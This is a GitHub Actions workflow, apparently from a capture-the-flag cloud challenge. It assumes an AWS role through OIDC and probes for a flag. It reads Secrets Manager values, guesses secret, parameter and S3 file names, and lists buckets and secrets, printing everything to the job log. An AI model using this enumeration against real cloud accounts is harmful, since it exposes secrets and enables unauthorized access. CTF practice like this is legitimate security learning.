name: Simple Flag Search

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  search-flag:
    runs-on: ubuntu-latest
    
    steps:
    - name: Configure AWS credentials using OIDC
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
        role-session-name: FlagSearch
        aws-region: us-west-2
        
    - name: Search for flag in accessible locations
      run: |
        echo "=== FLAG SEARCH ==="
        
        # Get the external_id
        EXTERNAL_ID=$(aws secretsmanager get-secret-value \
          --secret-id "internal/secrets/id-v2" \
          --query SecretString \
          --output text | jq -r '.external_id')
        echo "External ID: $EXTERNAL_ID"
        
        # Check if external_id itself is a secret name or contains the flag
        echo ""
        echo "=== Testing external_id variations ==="
        
        # Maybe the flag is hidden in the external_id
        echo "External ID decoded attempts:"
        
        # Try the external_id as a secret name
        aws secretsmanager get-secret-value --secret-id "$EXTERNAL_ID" 2>/dev/null || echo "extidHX9F3A1 not a secret"
        
        # Try HX9F3A1 part  
        aws secretsmanager get-secret-value --secret-id "HX9F3A1" 2>/dev/null || echo "HX9F3A1 not a secret"
        
        # Try just HX
        aws secretsmanager get-secret-value --secret-id "HX" 2>/dev/null || echo "HX not a secret"
        
        # Maybe it's a parameter instead
        aws ssm get-parameter --name "$EXTERNAL_ID" 2>/dev/null || echo "Not a parameter"
        aws ssm get-parameter --name "HX9F3A1" 2>/dev/null || echo "HX9F3A1 not a parameter"
        
        echo ""
        echo "=== S3 Flag Search ==="
        
        # Try the original bucket with specific flag files
        BUCKET="atr3404-63428fb6"
        
        # Common flag file names
        aws s3 cp s3://$BUCKET/flag.txt - 2>/dev/null || echo "No flag.txt"
        aws s3 cp s3://$BUCKET/flag.html - 2>/dev/null || echo "No flag.html" 
        aws s3 cp s3://$BUCKET/admin.html - 2>/dev/null || echo "No admin.html"
        aws s3 cp s3://$BUCKET/secret.txt - 2>/dev/null || echo "No secret.txt"
        aws s3 cp s3://$BUCKET/private.html - 2>/dev/null || echo "No private.html"
        
        # Try files named after the external_id
        aws s3 cp s3://$BUCKET/$EXTERNAL_ID.txt - 2>/dev/null || echo "No $EXTERNAL_ID.txt"
        aws s3 cp s3://$BUCKET/HX9F3A1.txt - 2>/dev/null || echo "No HX9F3A1.txt"
        
        echo ""
        echo "=== Simple Secret Names ==="
        
        # Try simple flag-related secret names
        aws secretsmanager get-secret-value --secret-id "flag" 2>/dev/null || echo "No 'flag' secret"
        aws secretsmanager get-secret-value --secret-id "ctf-flag" 2>/dev/null || echo "No 'ctf-flag' secret"
        aws secretsmanager get-secret-value --secret-id "internal/flag" 2>/dev/null || echo "No 'internal/flag' secret"
        aws secretsmanager get-secret-value --secret-id "hexnova404/flag" 2>/dev/null || echo "No 'hexnova404/flag' secret"
        
        echo ""
        echo "=== Check what we can actually list ==="
        
        # What can we actually see?
        echo "S3 buckets we can list:"
        aws s3 ls 2>/dev/null || echo "Cannot list S3"
        
        echo "Secrets we can list:"
        aws secretsmanager list-secrets 2>/dev/null || echo "Cannot list secrets"
        
        echo ""
        echo "=== Current permissions summary ==="
        aws sts get-caller-identity
